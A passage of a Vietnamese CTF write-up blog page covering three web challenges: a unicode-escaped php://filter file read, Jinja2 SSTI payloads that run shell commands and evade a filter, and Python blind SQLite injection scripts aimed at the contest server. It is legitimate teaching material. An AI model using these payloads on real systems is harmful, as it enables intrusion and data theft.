    }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      document.documentElement.removeAttribute(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage(
        {
          direction: ModeToggle.ID,
          message: this.modeStatus
        },
        '*'
      );
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }
        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }
      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.notify();
    } /* flipMode() */
  } /* ModeToggle */

  const modeToggle = new ModeToggle();
</script>

  

  <!-- A placeholder to allow defining custom metadata -->

</head>

  <!-- <style>
    body {
      background-image: url('/assets/background/background.jpg');
    }
    </style> -->

  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="https://pbs.twimg.com/profile_images/1771461862468579328/HqACG5Vs_400x400.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">Yuu's blog</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">I will write some CTF writeup here :v</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
        <a
          href="https://github.com/anzuukino"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/anzuukino"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['example','domain.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->

    
    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Wannagame Freshman CTF writeup</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Wannagame Freshman CTF writeup</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1699718400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Nov 11, 2023
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1711559504"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Mar 28, 2024
</time>

        </span>
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://github.com/anzuukino">Yuu</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1070 words"
>
  <em>5 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  <div class="content">
    <h1 id="wannawinfreshman-writeup">WannaWinFreshman-Writeup</h1>
<h2 id="bài-1-warmup-php"><span class="me-2">Bài 1 Warmup PHP:</span><a href="#bài-1-warmup-php" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/71156a59-19c3-4180-be30-2b3abeb10d1d" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/71156a59-19c3-4180-be30-2b3abeb10d1d" alt="image" loading="lazy"></a></p>

<ul>
  <li>Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là <strong>page</strong> và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server</li>
  <li>
    <p>Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viết<a href="https://trustfoundry.net/2018/12/20/bypassing-wafs-with-json-unicode-escape-sequences/">LINK</a>
<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/326ec395-87d2-4be9-a7c5-4e6071dc17f0" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/326ec395-87d2-4be9-a7c5-4e6071dc17f0" alt="image" loading="lazy"></a></p>
  </li>
  <li>
    <p>Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ 
<code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=/flag</code>
thành
<code class="language-plaintext highlighter-rouge">\u0070hp://filter/convert.base64-encode/resource=/flag</code>
<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/92cf2e27-8845-4860-90de-d34a1cebbdfe" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/92cf2e27-8845-4860-90de-d34a1cebbdfe" alt="image" loading="lazy"></a></p>
  </li>
  <li>Decode base64 và ra flag</li>
  <li>Flag: <strong>W1{w3lc0m3_w3b_w4rrj0rs}</strong>
    <h2 id="bài-2-namename"><span class="me-2">Bài 2 Namename:</span><a href="#bài-2-namename" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
    <p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/defe9e88-e3d5-414a-a13b-e3e72e7f9c19" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/defe9e88-e3d5-414a-a13b-e3e72e7f9c19" alt="image" loading="lazy"></a></p>
  </li>
  <li>
    <p>Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là <code class="language-plaintext highlighter-rouge">/wannaw1n</code>
<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/8f8ae6bf-3d67-4503-ba1a-60d567c8ecc1" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/8f8ae6bf-3d67-4503-ba1a-60d567c8ecc1" alt="image" loading="lazy"></a></p>
  </li>
  <li>Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2</li>
  <li>Payload : <code class="language-plaintext highlighter-rouge">{{().__class__.__base__.__subclasses__()[279]('ls',shell=1,stdout=-1).communicate()}}</code></li>
  <li>
    <p>Và nó bị chặn <a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/252274f5-06d8-4347-845e-6e446525d1de" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/252274f5-06d8-4347-845e-6e446525d1de" alt="image" loading="lazy"></a></p>
  </li>
  <li>
    <p>Sau vài thử nghiệm thì có vẽ nó chặn dấu <code class="language-plaintext highlighter-rouge">.</code> và <code class="language-plaintext highlighter-rouge">[]</code> nên mình chuyển qua <code class="language-plaintext highlighter-rouge">|attr </code></p>
  </li>
  <li>Payload mới: <code class="language-plaintext highlighter-rouge">{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(279)('ls',shell=1,stdout=-1)|attr('communicate')()}}</code></li>
  <li>Và nó đã hoạt động</li>
</ul>

<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/2aa34a0a-8783-4e3a-bfef-57e4e5f35538" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/2aa34a0a-8783-4e3a-bfef-57e4e5f35538" alt="image" loading="lazy"></a></p>

<ul>
  <li>
    <p>Bây giờ sửa lại payload từ <code class="language-plaintext highlighter-rouge">ls</code> sang <code class="language-plaintext highlighter-rouge">cat flag.txt</code>
<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/66dfde32-1efd-4d9f-9c6b-7003db035ef2" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/66dfde32-1efd-4d9f-9c6b-7003db035ef2" alt="image" loading="lazy"></a></p>
  </li>
  <li>Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu <code class="language-plaintext highlighter-rouge">.</code> và chữ <code class="language-plaintext highlighter-rouge">f</code> thì phải)</li>
  <li><code class="language-plaintext highlighter-rouge">{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(279)('cat+*',shell=1,stdout=-1)|attr('communicate')()}}</code></li>
  <li>Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag</li>
</ul>

<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/eb16cde7-852a-4c5c-bb9b-55413df94330" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/eb16cde7-852a-4c5c-bb9b-55413df94330" alt="image" loading="lazy"></a></p>

<ul>
  <li>Flag: <strong>W1{U_are_master_in_SSTI}</strong>
    <h2 id="bài-3-solite"><span class="me-2">Bài 3 Solite:</span><a href="#bài-3-solite" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
    <p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/6fd2d2cb-901f-46f3-bdeb-c215efb0ef9a" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/6fd2d2cb-901f-46f3-bdeb-c215efb0ef9a" alt="image" loading="lazy"></a></p>
  </li>
  <li>Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được</li>
  <li>Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox)</li>
</ul>

<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/5c47c030-9790-44ae-a5a2-903a5904b768" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/5c47c030-9790-44ae-a5a2-903a5904b768" alt="image" loading="lazy"></a></p>

<ul>
  <li>Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection</li>
  <li>
    <p>Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter
<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/a4f8f195-8a8c-4a9f-9d70-1cbca22199ac" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/a4f8f195-8a8c-4a9f-9d70-1cbca22199ac" alt="image" loading="lazy"></a></p>
  </li>
  <li>
    <p>Đây là query của bài
<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/14d13c79-1151-46d3-9288-13b8647e2de8" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/14d13c79-1151-46d3-9288-13b8647e2de8" alt="image" loading="lazy"></a></p>
  </li>
  <li>Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng</li>
  <li><code class="language-plaintext highlighter-rouge">Payload: 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),i,1) is 'a'--</code></li>
  <li>Tóm tắt :</li>
  <li>Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau <code class="language-plaintext highlighter-rouge">SELECT * FROM API WHERE id LIKE '%1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--%'</code></li>
  <li><code class="language-plaintext highlighter-rouge">select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'</code> sẽ trả về tên của tất cả các bảng</li>
  <li><code class="language-plaintext highlighter-rouge">substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1)</code> sẽ lấy 1 ký tự a bắt đầu từ vị trí i</li>
  <li><code class="language-plaintext highlighter-rouge">1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--</code> cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là <code class="language-plaintext highlighter-rouge">SELECT * FROM API WHERE id LIKE '%1'</code> và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả</li>
  <li>Đây là script mình tìm tên của bảng</li>
</ul>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">string</span><span class="p">,</span><span class="n">requests</span>
<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>

<span class="n">all_characters</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="sh">"</span><span class="s">!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}</span><span class="sh">"</span>
<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://45.122.249.68:20020/search?name[]=</span><span class="sh">"</span>
<span class="n">payload</span><span class="o">=</span><span class="sh">"</span><span class="s">1</span><span class="sh">'</span><span class="s"> and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is </span><span class="sh">'</span><span class="s">table</span><span class="sh">'</span><span class="s"> and tbl_name NOT like </span><span class="sh">'</span><span class="s">sqlite_%</span><span class="sh">'</span><span class="s">),1,1) is </span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="s">--</span><span class="sh">"</span>
<span class="n">table_name</span> <span class="o">=</span> <span class="sh">""</span>
<span class="n">haha</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">ps</span> <span class="ow">in</span> <span class="n">all_characters</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span><span class="sh">"</span><span class="s">1</span><span class="sh">'</span><span class="s"> and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is </span><span class="sh">'</span><span class="s">table</span><span class="sh">'</span><span class="s"> and tbl_name NOT like </span><span class="sh">'</span><span class="s">sqlite_%%</span><span class="sh">'</span><span class="s">),%d,1) is </span><span class="sh">'</span><span class="s">%c</span><span class="sh">'</span><span class="s">--</span><span class="sh">"</span> <span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">ps</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span>  <span class="nf">quote</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">urlx</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">payload</span>
        <span class="c1">#print(urlx)
</span>        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">urlx</span><span class="p">)</span>
        <span class="k">if</span> <span class="sh">"</span><span class="s">id</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
            <span class="n">table_name</span> <span class="o">+=</span> <span class="n">ps</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Table names: </span><span class="sh">"</span><span class="p">,</span><span class="n">table_name</span><span class="p">)</span>
            <span class="n">haha</span> <span class="o">+=</span><span class="mi">1</span>
    <span class="k">if</span> <span class="n">haha</span> <span class="o">&lt;</span> <span class="n">i</span><span class="p">:</span>
        <span class="k">break</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Success all the names of the tables are:</span><span class="sh">"</span><span class="p">,</span><span class="n">table_name</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<ul>
  <li>Và tìm ra được tên của các bảng là
<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/de22bd13-a94c-4b06-b556-bc7125006578" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/de22bd13-a94c-4b06-b556-bc7125006578" alt="image" loading="lazy"></a></li>
</ul>

<p><code class="language-plaintext highlighter-rouge">Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0</code></p>
<ul>
  <li>Bây giờ dựa vào cái trên lấy ra flag từ bảng <code class="language-plaintext highlighter-rouge">flag_c1abd148_acae_40be_a953_eae333f90da0</code> thôi</li>
  <li>Script của mình</li>
</ul>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">string</span><span class="p">,</span><span class="n">requests</span>
<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>

<span class="n">all_characters</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="sh">"</span><span class="s">!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}</span><span class="sh">"</span>
<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://45.122.249.68:20020/search?name[]=</span><span class="sh">"</span>

<span class="n">table_name</span> <span class="o">=</span> <span class="sh">"</span><span class="s">flag_c1abd148_acae_40be_a953_eae333f90da0</span><span class="sh">"</span>
<span class="c1">#payload = "1' and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is 'a'--"
</span><span class="n">haha</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">flag</span> <span class="o">=</span><span class="sh">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">ps</span> <span class="ow">in</span> <span class="n">all_characters</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span><span class="sh">"</span><span class="s">1</span><span class="sh">'</span><span class="s"> and substr((select flag from %s),%d,1) is </span><span class="sh">'</span><span class="s">%c</span><span class="sh">'</span><span class="s">--</span><span class="sh">"</span> <span class="o">%</span><span class="p">(</span><span class="n">table_name</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">ps</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span>  <span class="nf">quote</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">urlx</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">payload</span>
        <span class="c1">#print(urlx)
</span>        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">urlx</span><span class="p">)</span>
        <span class="k">if</span> <span class="sh">"</span><span class="s">id</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="n">ps</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Flag is: </span><span class="sh">"</span><span class="p">,</span><span class="n">flag</span><span class="p">)</span>
            <span class="n">haha</span> <span class="o">+=</span><span class="mi">1</span>
    <span class="k">if</span> <span class="n">haha</span> <span class="o">&lt;</span> <span class="n">i</span><span class="p">:</span>
        <span class="k">break</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Here is your flag:</span><span class="sh">"</span><span class="p">,</span><span class="n">flag</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
